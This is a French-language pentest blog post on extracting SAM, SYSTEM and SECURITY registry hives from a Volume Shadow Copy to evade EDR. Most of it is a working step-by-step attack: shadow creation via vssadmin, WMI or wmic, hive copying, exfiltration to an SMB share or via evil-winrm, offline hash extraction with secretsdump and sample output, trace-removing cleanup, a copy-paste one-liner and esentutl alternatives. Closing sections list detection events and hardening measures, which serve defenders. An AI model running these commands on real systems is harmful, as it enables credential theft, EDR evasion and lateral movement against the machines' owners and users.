---
title: "Shadow Copy — Dumper SAM et LSA quand l'EDR bloque tout"
date: 2026-11-06 10:00:00 +0100
categories: [Techniques]
tags: [shadow-copy, vss, sam, lsa, credential-theft, edr-bypass, windows, active-directory]
description: "Le Volume Shadow Copy Service (VSS) permet de copier SAM, SYSTEM et SECURITY depuis un cliché instantané, sans déclencher l'EDR. Technique, détection et durcissement."
---

> **TL;DR** — En pentest interne, les EDR modernes bloquent systématiquement `reg save`, `procdump` et les outils classiques d'extraction de credentials. La technique du **shadow copy** (cliché instantané de volume) contourne ces protections en copiant SAM, SYSTEM et SECURITY directement depuis un snapshot VSS — une simple copie de fichier que l'EDR ne détecte pas. En 2026, la majorité des EDR du marché ne bloquent toujours pas cette technique de manière fiable.
{: .prompt-info }

| | |
|---|---|
| **Contexte** | Pentest interne, post-exploitation Windows |
| **Prérequis** | Admin local sur la machine cible |
| **Cible** | SAM (hash locaux), SECURITY (secrets LSA, DCC2), SYSTEM (BootKey) |
| **Outils** | vssadmin, WMI, esentutl, impacket (`secretsdump`) |
| **MITRE ATT&CK** | [T1003.002 — SAM](https://attack.mitre.org/techniques/T1003/002/), [T1003.004 — LSA Secrets](https://attack.mitre.org/techniques/T1003/004/) |

## 1. Le contexte

Après avoir obtenu un accès admin local sur une machine, l'extraction des credentials est une étape clé. Trois fichiers du registre sont ciblés, chacun avec un rôle précis :

- **SAM** (`C:\Windows\System32\config\SAM`) — contient les **hash NTLM des comptes locaux** de la machine : le compte Administrateur local (RID 500) et tout autre compte créé localement. Ces hash peuvent être craqués offline ou réutilisés en pass-the-hash pour pivoter si le même mot de passe admin local est réutilisé (absence de LAPS).

- **SECURITY** (`C:\Windows\System32\config\SECURITY`) — contient les **secrets LSA** : credentials des comptes de service configurés pour démarrer automatiquement, le mot de passe machine (compte `MACHINE$` du domaine), et les **DCC2** (Domain Cached Credentials) — les hash des ~10 derniers comptes du domaine ayant ouvert une session sur la machine. Les DCC2 permettent de retrouver les mots de passe par cracking offline, y compris des comptes à privilèges si un admin s'est connecté à la machine.

- **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) — contient la **Boot Key** (ou SysKey), une clé de chiffrement nécessaire pour déchiffrer les hash de la SAM et les secrets LSA. Sans ce fichier, les deux autres sont inexploitables.

## 2. Ce que l'EDR bloque (et pourquoi)

Les méthodes classiques d'extraction sont connues de tous les EDR :

### 2.1 `reg save`

```powershell
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\sys
reg save HKLM\SECURITY C:\temp\sec
```

Le processus est immédiatement tué. L'EDR hooke l'API `RegSaveKeyExW`, détecte le pattern `reg save` + `HKLM\SAM` et l'associe à T1003.002.

### 2.2 `procdump` sur LSASS

```powershell
procdump.exe -ma lsass.exe C:\temp\lsass.dmp
```

Bloqué. L'EDR protège le processus LSASS contre les tentatives de dump mémoire (handle `PROCESS_VM_READ` refusé ou processus tué).

### 2.3 `secretsdump` en remote

```bash
nxc smb <IP> -u admin -p 'Password!' --sam
nxc smb <IP> -u admin -p 'Password!' --lsa
```

Le fichier de sortie créé côté cible est détecté et supprimé par l'EDR avant que NetExec puisse le récupérer.

> **Point commun** — toutes ces méthodes passent par des API surveillées (`RegSaveKeyExW`, `MiniDumpWriteDump`, ouverture de handle sur LSASS) ou des patterns de ligne de commande connus. C'est exactement ce que l'EDR surveille.
{: .prompt-info }

## 3. La technique : Shadow Copy (VSS)

Le **Volume Shadow Copy Service** est un service Windows légitime utilisé pour les sauvegardes. Il crée un **snapshot figé** du système de fichiers à un instant T. Les fichiers dans ce snapshot ne sont pas verrouillés et ne sont pas surveillés de la même manière par l'EDR.

### 3.1 Pourquoi ça passe

L'EDR surveille les accès aux ruches du registre en hookant des API comme `RegSaveKeyExW`. Quand on copie les fichiers SAM/SYSTEM/SECURITY depuis un snapshot VSS, on ne passe pas par ces API : on fait une **simple copie de fichier**, comme on copierait n'importe quel `.txt`. L'EDR ne voit qu'un `copy` depuis un chemin `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\...` — ce n'est pas un pattern qu'il bloque.

```text
Méthode classique (bloquée)          Shadow Copy (passe)
────────────────────────────         ──────────────────────────
reg save HKLM\SAM ...                copy \\?\GLOBALROOT\...\config\SAM ...
    │                                    │
    ▼                                    ▼
RegSaveKeyExW (API hookée)           CopyFileW (copie fichier standard)
    │                                    │
    ▼                                    ▼
EDR détecte → kill                   EDR ne détecte pas → succès
```

### 3.2 Exploitation

**Étape 1 — Créer le shadow copy :**

```powershell
vssadmin create shadow /for=C:

# Sortie :
# Successfully created shadow copy for 'C:\'
#    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

> **Si `vssadmin` est surveillé**, passer par WMI :
> ```powershell
> (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
> ```
> Ou via `wmic` :
> ```cmd
> wmic shadowcopy call create Volume='C:\'
> ```
{: .prompt-tip }

**Étape 2 — Copier les fichiers depuis le snapshot :**

```powershell
mkdir C:\temp -ErrorAction SilentlyContinue

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\temp\sys
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SECURITY C:\temp\sec
```

> Le numéro du shadow copy (`ShadowCopy2`) varie. Pour lister les clichés existants :
> ```powershell
> vssadmin list shadows
> ```
{: .prompt-tip }

**Étape 3 — Exfiltrer les fichiers :**

```powershell
# Option 1 : copie vers un partage réseau
copy C:\temp\sam \\10.0.1.13\Public\s
copy C:\temp\sys \\10.0.1.13\Public\y
copy C:\temp\sec \\10.0.1.13\Public\e

# Option 2 : download via evil-winrm
download C:\temp\sam /tmp/sam
download C:\temp\sys /tmp/sys
download C:\temp\sec /tmp/sec
```

**Étape 4 — Extraire les credentials offline :**

```bash
impacket-secretsdump -sam /tmp/sam -system /tmp/sys -security /tmp/sec LOCAL
```

```text
[*] Target system bootKey: 0x...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27fbeff84a2dad0c122a7c88eb78490f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
DOMAIN.LOCAL/svc-backup:$DCC2$10240#svc-backup#a8f2e...
[*] Dumping LSA Secrets
$MACHINE.ACC: ...
DPAPI_SYSTEM: ...
```

**Étape 5 — Nettoyage :**

```powershell
# Supprimer les fichiers copiés
del C:\temp\sam, C:\temp\sys, C:\temp\sec

# Supprimer le shadow copy créé
vssadmin delete shadows /for=C: /quiet
```

> **Le nettoyage fait partie de l'exploitation.** En mission, on ne laisse pas traîner des ruches du registre sur la cible. C'est aussi un indicateur pour le blue team : un shadow copy créé puis supprimé dans la foulée, c'est suspect.
{: .prompt-warning }

### 3.3 One-liner PowerShell

Pour un copier-coller rapide en mission :

```powershell
$s = (vssadmin create shadow /for=C: | Select-String "Volume Name").ToString().Split(":")[1].Trim()
copy "$s\Windows\System32\config\SAM" C:\temp\s
copy "$s\Windows\System32\config\SYSTEM" C:\temp\y
copy "$s\Windows\System32\config\SECURITY" C:\temp\e
vssadmin delete shadows /for=C: /quiet
```

## 4. Alternatives et outils

| Outil | Méthode | Avantage |
|---|---|---|
| **vssadmin** | Shadow copy natif | Aucun binaire à déposer, présent sur tous les Windows |
| **WMI** (`Win32_ShadowCopy`) | Shadow copy via WMI | Contourne la surveillance de vssadmin |
| **esentutl** | Copie de fichiers verrouillés via VSS | `esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\temp\sam` |
| [**SAMDump**](https://ricardojoserf.github.io/samdump) | VSS + NTAPIs + exfil réseau | Évite d'écrire sur disque, obfuscation XOR |
| **reg export** | Export texte des ruches | Non bloqué par certains EDR ([source](https://www.orangecyberdefense.com/global/blog/cybersecurity/bypassing-edr-to-dump-lsa-secrets)), mais nécessite reconstruction |

> **`esentutl`** mérite une mention spéciale : c'est un LOLBin signé Microsoft qui peut copier un fichier verrouillé directement via VSS en une seule commande, sans créer de shadow copy manuellement :
> ```powershell
> esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\temp\sam
> esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\temp\sys
> esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d C:\temp\sec
> ```
{: .prompt-tip }

## 5. Détection

Pour les défenseurs, voici les indicateurs à surveiller :

| Indicateur | Source | Signal |
|---|---|---|
| Création d'un shadow copy | **Event 8222** (VSS) | Création inattendue hors fenêtre de backup |
| Exécution de `vssadmin create shadow` | **Sysmon Event 1** / EDR telemetry | Ligne de commande contenant `create shadow` |
| Appel WMI `Win32_ShadowCopy.Create` | **Event 5857** (WMI Activity) | Création de shadow copy par WMI |
| Accès aux chemins VSS | **Sysmon Event 11** (FileCreate) | Fichier copié depuis `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*` |
| Suppression de shadow copies | **Sysmon Event 1** / **Security Event 4688** | Ligne de commande contenant `delete shadows` ou `shadowcopy delete` — nettoyage post-exploitation |
| Exécution de `esentutl /y /vss` | **Sysmon Event 1** | LOLBin utilisé pour copier des fichiers verrouillés |

> **Le signal le plus fiable** : un shadow copy créé puis supprimé en quelques minutes, combiné à des copies de fichiers depuis le chemin VSS vers un répertoire temporaire. En backup légitime, le shadow copy persiste beaucoup plus longtemps.
{: .prompt-info }

## 6. Recommandations

| Mesure | Ce que ça bloque |
|---|---|
| **LAPS** (Local Administrator Password Solution) — un mot de passe admin local unique par machine | Pass-the-hash avec le hash admin local : même si on dump la SAM, le hash ne sert que sur cette machine |
| **Tiering** — les comptes à privilèges (T0/T1) ne se connectent jamais sur les postes utilisateurs | Plus de DCC2 de comptes sensibles dans les caches des workstations |
| **Protected Users** — ajouter les comptes sensibles au groupe | Pas de cache de credentials (DCC2) sur les machines où ils se connectent |
| **Credential Guard** — isolation matérielle des secrets LSASS | Protège les secrets en mémoire (pas directement SAM sur disque, mais complémentaire) |
| **Monitoring VSS** — alerter sur Event 8222 (création) et Event 4688 / Sysmon 1 (suppression via ligne de commande) hors fenêtre de backup | Détection de l'exploitation VSS |
| **Restreindre `SeBackupPrivilege`** — ne l'accorder qu'aux comptes de backup dédiés | Réduit les comptes capables de lire des fichiers protégés, notamment via les chemins VSS |

Le shadow copy est une technique simple, native et efficace pour extraire SAM, SYSTEM et SECURITY quand l'EDR bloque les méthodes classiques. Elle exploite un service Windows légitime que l'EDR ne peut pas désactiver sans casser les sauvegardes de production. La majorité des EDR ne détectent toujours pas cette technique de manière fiable, parce qu'elle ne déclenche aucun des patterns habituels : pas d'appel `RegSaveKeyExW`, pas de processus suspect ouvrant un handle sur LSASS, pas d'argument `reg save` en ligne de commande.

> **En résumé** : ne pas se reposer uniquement sur l'EDR pour la protection des credentials. Mettre en place des contrôles complémentaires — LAPS, tiering, Protected Users, monitoring VSS — qui restent efficaces quelle que soit la méthode d'extraction.
{: .prompt-info }

## Références

- [MITRE ATT&CK T1003.002 — OS Credential Dumping: Security Account Manager](https://attack.mitre.org/techniques/T1003/002/)
- [MITRE ATT&CK T1003.004 — OS Credential Dumping: LSA Secrets](https://attack.mitre.org/techniques/T1003/004/)
- [Microsoft — Volume Shadow Copy Service](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)
- [Microsoft — vssadmin](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin)
- [SAMDump — ricardojoserf](https://ricardojoserf.github.io/samdump)
- [Orange Cyberdefense — Bypassing EDR to Dump LSA Secrets](https://www.orangecyberdefense.com/global/blog/cybersecurity/bypassing-edr-to-dump-lsa-secrets)
- [LOLBAS — esentutl](https://lolbas-project.github.io/lolbas/Binaries/Esentutl/)
- [Microsoft LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [The Hacker Recipes — SAM & LSA Secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)
